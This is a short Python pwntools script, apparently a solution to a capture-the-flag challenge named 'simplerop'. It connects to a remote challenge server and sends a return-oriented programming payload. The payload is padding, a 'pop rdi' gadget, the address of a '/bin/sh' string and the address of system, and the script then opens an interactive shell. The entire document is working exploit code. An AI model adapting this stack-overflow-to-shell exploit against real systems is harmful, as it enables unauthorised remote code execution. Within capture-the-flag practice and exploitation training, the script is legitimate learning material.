from pwn import *


#p = process("./simplerop")
p = remote("chal.ctf.b01lers.com", 1008)

system = 0x4011df
binsh = 0x402008

pop_rdi_ret = 0x0000000000401273

payload = "A"*0x8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
p.send(payload)

p.interactive()